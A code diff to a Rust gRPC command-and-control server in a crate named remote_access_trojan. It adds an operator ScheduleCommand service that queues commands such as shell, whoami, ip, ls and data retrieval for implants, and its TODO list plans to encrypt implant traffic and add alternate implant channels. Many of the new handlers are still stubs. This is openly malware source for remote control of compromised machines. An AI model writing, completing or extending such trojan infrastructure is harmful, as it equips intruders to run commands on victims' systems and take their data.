@@ -1,9 +1,10 @@
-use remote_access_trojan::rat::RatCommand;
+use remote_access_trojan::rat::{OperatorCommand, RatCommand};
 use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
+use remote_access_trojan::rat::schedule_command_server::{ScheduleCommand, ScheduleCommandServer};
 use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
 use std::collections::HashMap;
-use std::fmt;
+use std::convert::From;
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::path::Path;
@@ -12,31 +13,44 @@ use tonic::transport::Server;
 
 /*
 TODO
-    - encrypt traffic from implant to server
-    - server 'help' command
-    - alternate communication method(s) between implant and server
+    - server state mutable
     - accept commands from operator to server
+    - server 'help' command
+    - server 'retrieve' command
+    - server 'implants' command
+    - encrypt traffic from implant to server
     - encrypt traffic from operator to server
+    - alternate communication method(s) between implant and server
 */
 
 // Create a wrapper for RatCommand so I can implement a formatter
 #[derive(Debug)]
-struct FormattableRatCommand(RatCommand);
+struct FormattableRatCommand<'a>(&'a str);
 
-// Allow the wrapper struct to print itself as a string
-impl fmt::Display for FormattableRatCommand {
-    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
-        write!(f, "{self:?}")
+impl From<RatCommand> for &FormattableRatCommand<'_> {
+    fn from(rat_command: RatCommand) -> Self {
+        match rat_command {
+            RatCommand::Cadence => &FormattableRatCommand("cadence"),
+            RatCommand::Dir => &FormattableRatCommand("dir"),
+            RatCommand::Hostname => &FormattableRatCommand("hostname"),
+            RatCommand::Ip => &FormattableRatCommand("ip"),
+            RatCommand::Ls => &FormattableRatCommand("ls"),
+            RatCommand::None => &FormattableRatCommand("none"),
+            RatCommand::Os => &FormattableRatCommand("os"),
+            RatCommand::Quit => &FormattableRatCommand("quit"),
+            RatCommand::Shell => &FormattableRatCommand("shell"),
+            RatCommand::Whoami => &FormattableRatCommand("whoami"),
+        }
     }
 }
 
 // Convert a RatCommand enum variant to the string that the operator typed
 fn pretty_print_command(command: RatCommand) -> String {
-    let command = FormattableRatCommand(command).to_string();
-    let command: Vec<&str> = command.split("(").collect();
-    let command = command[command.len() - 1];
-    let command: Vec<&str> = command.split(")").collect();
-    command[0].to_lowercase().to_string()
+    let command: &FormattableRatCommand = command.into();
+    let command = format!("{command:?}");
+    let command: Vec<&str> = command.split(&['(', ')'])
+                                    .collect();
+    command[1].trim_matches(|s| s == '"').to_lowercase()
 }
 
 #[derive(Default)]
@@ -109,6 +123,59 @@ impl RecordCommandResult for MyRecordCommandResult {
     }
 }
 
+#[derive(Default)]
+pub struct MyScheduleCommand {}
+
+#[tonic::async_trait]
+impl ScheduleCommand for MyScheduleCommand {
+    async fn send(&self, request: Request<CommandRequest>) -> Result<Response<Empty>, Status> {
+        // Get the request from the operator and figure out what to do with it
+        let command = OperatorCommand::from_i32(request.into_inner().command).unwrap();
+        // Run the applicable command
+        let command_result = match command {
+            OperatorCommand::OpCadence => {
+                // Passthrough
+            },
+            OperatorCommand::OpDir => {
+                // Passthrough
+            },
+            OperatorCommand::OpImplants => {
+                // List all implant IDs
+            },
+            OperatorCommand::OpHelp => {
+                // List available commands
+            },
+            OperatorCommand::OpHostname => {
+                // Passthrough
+            },
+            OperatorCommand::OpIp => {
+                // Passthrough
+            },
+            OperatorCommand::OpLs => {
+                // Passthrough
+            },
+            OperatorCommand::OpOs => {
+                // Passthrough
+            },
+            OperatorCommand::OpQuit => {
+                // Passthrough
+            },
+            OperatorCommand::OpRetrieve => {
+                // Retrieve data from implant
+            },
+            OperatorCommand::OpShell => {
+                // Passthrough
+            },
+            OperatorCommand::OpWhoami => {
+                // Passthrough
+            }
+        };
+        // Respond to the implant basically say 'done'
+        Ok(Response::new(
+            Empty {}
+        ))
+    }
+}
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -120,6 +187,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     Server::builder()
         .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
         .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
+        .add_service(ScheduleCommandServer::new(MyScheduleCommand::default()))
         .serve(socket)
         .await?;
 
